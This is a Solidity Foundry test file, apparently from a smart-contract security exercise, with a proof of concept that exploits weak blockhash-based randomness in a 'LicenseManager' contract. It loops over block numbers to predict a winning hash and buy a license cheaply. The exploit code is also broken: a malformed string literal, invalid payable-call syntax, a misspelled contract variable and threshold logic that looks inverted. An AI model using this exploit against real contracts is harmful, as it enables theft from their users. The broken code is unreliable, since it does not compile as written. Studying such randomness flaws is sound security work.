// SPDX-License-Identifier: MIT
pragma solidity ^0.8.19;

import {Test} from "forge-std/Test.sol";
import {LicenseManager} from "../src/licence.sol";

contract LicenseManagerTest is Test {
    LicenseManager license;


    address owner = makeAddr("owner");
    address user1 = makeAddr("user1");
    address user2 = makeAddr("user2");
    address user3 = makeAddr("user3");
    address user4 = makeAddr("user4");


    address attacker = makeAddr("attacker");

    function setUp() public {
        vm.prank(owner);
        license = new LicenseManager();

        vm.deal(user1, 1 ether);
        vm.deal(user2, 1 ether);
        vm.deal(user3, 1 ether);
        vm.deal(user4, 1 ether);

        vm.prank(user1);
        license.buyLicenese{value: 1 ether}();

        vm.prank(user2);
        license.buyLicenese{value: 1 ether}();

        vm.prank(user3);
        license.buyLicenese{value: 1 ether}();

        vm.prank(user4);
        license.buyLicenese{value: 1 ether}();
    }

    //exploit for bad randomness
    function test_bad_randomness() public {
        vm.deal(attacker, 0.01 ether);
        vm.startPrank(attacker);

        console.log("testing bad randomness with blockHash");
        console.log(attacker.balance);
        uint blockNumber = block.number;
        for (uint i = 0; i < 100; i++) {
            vm.roll(blockNumber);
            uint maxThreshold = uint(0.01 ether / 1e16);
            uint hashed = uint(keccak256(abi.encodePacked(uint256(0.01 ether), address(attacker), uint(1337), blockhash(block.number - 1)))) % 100;
            console.log(""we are on blockNumber", blockNumber, "with hashed number ", hashed);
            if (hashed > maxThreshold) {
                console.log("\\FOUND!  send 0.01 ether to obtain the license");
                license.winLicense(value: 0.01 ether);
                break;
            }
            blockNumber++;
        }
        assertEq(true, licence.checkLicense());
        vm.stopPrank();



    }
}


